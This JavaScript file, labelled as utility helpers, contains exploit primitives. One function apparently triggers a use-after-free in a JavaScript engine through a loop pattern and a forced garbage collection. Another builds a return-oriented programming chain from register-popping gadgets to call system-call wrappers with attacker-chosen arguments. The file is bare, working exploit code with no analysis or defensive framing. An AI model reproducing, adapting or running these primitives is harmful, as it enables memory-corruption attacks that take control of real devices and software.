// Utility helper functions

function make_uaf (arr) {
  var o = {}
  for (var i in { xx: '' }) {
    for (i of [arr]);
    o[i]
  }

  gc()
}

function build_rop_chain (wrapper_addr, arg1, arg2, arg3, arg4, arg5, arg6) {
  var chain = []

  if (typeof arg1 !== 'undefined') {
    chain.push(gadgets.POP_RDI_RET)
    chain.push(arg1)
  }
  if (typeof arg2 !== 'undefined') {
    chain.push(gadgets.POP_RSI_RET)
    chain.push(arg2)
  }
  if (typeof arg3 !== 'undefined') {
    chain.push(gadgets.POP_RDX_RET)
    chain.push(arg3)
  }
  if (typeof arg4 !== 'undefined') {
    // Use RCX for function wrappers (not R10)
    // Wrappers do "mov r10, rcx" before syscall
    chain.push(gadgets.POP_RCX_RET)
    chain.push(arg4)
  }
  if (typeof arg5 !== 'undefined') {
    chain.push(gadgets.POP_R8_RET)
    chain.push(arg5)
  }
  if (typeof arg6 !== 'undefined') {
    chain.push(gadgets.POP_R9_JO_RET)
    chain.push(arg6)
  }

  chain.push(wrapper_addr)
  return chain
}
